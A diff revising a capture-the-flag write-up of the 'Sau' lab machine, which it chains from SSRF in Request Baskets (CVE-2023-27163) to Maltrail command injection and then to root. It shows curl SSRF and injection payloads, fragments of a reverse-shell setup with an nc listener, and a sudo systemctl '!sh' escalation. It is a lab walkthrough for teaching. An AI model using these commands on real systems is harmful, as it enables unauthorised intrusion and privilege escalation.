@@ -6,7 +6,7 @@ by Roqeeb
 ```
 nmap -sC -sV 10.10.11.224 -vvv -T3 -oN nmap
 ```
-From our scan there are two open ports opened ports 22 and 55555 ,due the speed of my scan i also got some false positives port 80 and 6003 with the ‘filtered’ state i will be ignoring because accessing them provides no response
+From our scan there are two open ports opened ports 22 and 55555 ,due the speed of my scan i also got some false positives port 80 and 6003 with the ‘filtered’ state, i will be ignoring because accessing them provides no response.
 
 
 
@@ -57,11 +57,10 @@ PORT      STATE    SERVICE REASON      VERSION
 |     Date: Tue, 25 Jul 2023 05:29:07 GMT
 |_    Content-Length: 0
 ```
-So i will start enumeration from port 55555 from our scan we can see there's a webserver running on that port,i opened it in my web browser and there's a site called request baskets, on the bottom left there's a version number
+I will start enumeration from port 55555 from our scan we can see there's a webserver running on that port,i opened it in my web browser and there's a webapp called request baskets, on the bottom left there's a version number
 ![homepage](https://github.com/0xRoqeeb/writeups/assets/49154037/5e98fb0e-a7ff-41d3-9512-da0b43de3894)
 
-
-i started poking around the site to find out how it works, it's a application that allows you to create a basket with gives you a url and any request mcade to that basket will be collected on the site i.e the requests basket
+i started poking around the site to find out how it works, it's a application that allows you to create a basket with gives you a url and any request made to that url will be collected on your basket hence the name requests basket
 
 so i tested GET and POST requests on the url using curl i didnt get a response in my terminal but the requests were collected in the request basket
 
@@ -73,7 +72,9 @@ so i tested GET and POST requests on the url using curl i didnt get a response i
 ```
 ![eq](https://github.com/0xRoqeeb/writeups/assets/49154037/a6bd4d84-8136-4da2-8ad2-3e4fcf09b3ee)
 
-I created a new basket and intercepted the request with burpsuite ,it didn't reveal much.  
+# Vulnerability Assessment
+
+Next I created a new basket and intercepted the request with burpsuite ,it didn't reveal much.  
 After that i looked up the version number of requests basket online to check if this current version was vulnerable and i found out that it was susceptible to SSRF, it also has a POC [CVE-2023-27163]( https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)
 
 ```console
@@ -81,7 +82,7 @@ POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80
 ```
 
 It turns out that the /api/baskets/name and /baskets/name are the  API endpoints vulnerable to unauthenticated SSRF.
-requests sent to the request basket url will be reflected on the url in the ***forward_url** parameter  
+requests sent to /baskets/name url will be reflected on the url in the ***forward_url** parameter  
 
 you can do this with a curl command
 
@@ -89,7 +90,7 @@ you can do this with a curl command
 curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}'
 ```
 
-but i'll be doing it directly from the web application, to do that we navigate to out basket page and click on the settings icon top right
+but i'll be doing it directly from the web application, to do that we navigate to our baskets page and click on the settings icon top right
 ![2023-07-25_08-51](https://github.com/0xRoqeeb/writeups/assets/49154037/d181f742-6a23-4fa0-84e5-889fb4bf1c7f)
 
 on the configuration page we set the fields as follows
@@ -101,10 +102,9 @@ on the configuration page we set the fields as follows
 
 after that click apply to save changes
 
-now we access our bask
-et url again and this time we're seeing something different we come across a CSS starved website ,looking at the bottom left i found out this website was *Powered by Maltrail (v0.53)*
+now we access our basket through the url again and this time we're seeing something different we come across a CSS starved website ,looking at the bottom left i found out this website was *Powered by Maltrail (v0.53)*
 ![2023-07-25_13-03_1](https://github.com/0xRoqeeb/writeups/assets/49154037/81dda296-d4cb-4674-8582-11e69860ef24) 
-A bit of google and i found out this version was vulnerable to Unauthenticated OS Command Injection the username parameter in the */login* page
+A bit of googling and i found out this version was vulnerable to Unauthenticated OS Command Injection, the username parameter in the */login* page caontained the command injection vulnerability
 POC
 ```console
 curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
@@ -121,7 +121,8 @@ curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward
 trying to access the login page from the browser gives us this response, so we'll have to use curl from here
 ![2023-07-25_08-14](https://github.com/0xRoqeeb/writeups/assets/49154037/a6d098d7-106f-48fd-b1b9-10d61294e188)
 
-getting a revrerse shell
+# Exploitation
+Getting a reverse shell
 
 I created a shell.sh file with my payload in it and setup a python webserver to host it on port 80 preferably
 make sure the payload file is in the same folder you set up the webserver
@@ -161,12 +162,13 @@ zsh: suspended  nc -lvnp 4444
 puma@sau:/opt/maltrail$ export TERM=xterm
 puma@sau:/opt/maltrail$
 ```
+# Privilege Escalation
 now we have an interactive shell .once we get initial access the road to root on sau is a piece of cake
 
 running the command sudo -l to see the commands our current user can run
 ![2023-07-25_08-19](https://github.com/0xRoqeeb/writeups/assets/49154037/b0687b33-f3e4-474e-af63-901892f95980)
 we can run */usr/bin/systemctl status trail.service* as root and **NOPASSWD** means we can invoke the sudo command without a password
-so i checked gtfobins for the binary we have access too and luckily there's and entry for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
+I checked gtfobins for the binary we have access too and luckily there's and entry for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
 
 ![2023-07-25_08-25_1](https://github.com/0xRoqeeb/writeups/assets/49154037/29ad70a9-90ff-4308-86ac-5a93df524b7f)
 Let's run the command ```/usr/bin/systemctl status trail.service```
@@ -174,6 +176,8 @@ and input “!sh” to spawn a shell
 
 ![2023-07-25_08-29](https://github.com/0xRoqeeb/writeups/assets/49154037/af301225-b263-45ec-94c9-b699ecb2573f) 
 and we're root:)
+
+
 
 
 
